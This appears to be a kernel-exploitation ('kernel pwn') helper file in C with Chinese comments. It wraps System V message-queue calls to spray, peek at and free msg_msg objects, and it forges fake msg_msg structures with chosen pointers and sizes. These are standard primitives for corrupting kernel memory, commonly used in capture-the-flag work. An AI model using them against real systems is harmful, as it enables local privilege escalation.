/*
 * msg_msg in kernel pwn
 */
struct list_head {
  uint64_t next;
  uint64_t prev;
};

// 每一条消息都有此 header 双向链表
struct msg_msg {
  struct list_head m_list;
  uint64_t m_type;  // 创建指定type, 在rcv 时可以通过此标志find_msg
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
};


// 当单条消息长度超过 0x1000-sizeof(msg_msg) 使用此部分拼接消息。
struct msg_msgseg {
  uint64_t next;
};

// 我们从用户态发送到内核态的每条消息格式
// mtext 写上 tag 和 idx 比较方便 寻找 msg
struct msgbuf {
  long mtype;
  char mtext[0];
};

// 调用msg_get 创建 msg_queue, 返回值为一个 msgqid
int make_msg_queue(void) { return msgget(IPC_PRIVATE, 0666 | IPC_CREAT); }

// 接受信息同时 free 掉msg_msg。
int recv_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0);
}

// 创建msg_msg结构体, msgp => msgbuf 结构体，
int send_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  ((struct msgbuf *)msgp)->mtype = msgtyp;
  return msgsnd(msqid, msgp, msgsz - sizeof(long), 0);
}

// 读取消息而不free
// msgtyp => count 顺序
int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  return msgrcv(msqid, msgp, msgsz, msgtyp,
                MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

// 伪造一个msg_msg结构体
void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev,
               uint64_t m_type, uint64_t m_ts, uint64_t next,
               uint64_t security) {
  msg->m_list.next = m_list_next;
  msg->m_list.prev = m_list_prev;
  msg->m_type = m_type;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = security;  // 设置为 0
}

// 删除消息队列
void delete_msg_queue(int msqid, int cmd, struct msqid_ds *buf) {
  if ((msgctl(msqid, cmd, buf)) == -1) {
    die("delete msg queue fail")
  }
}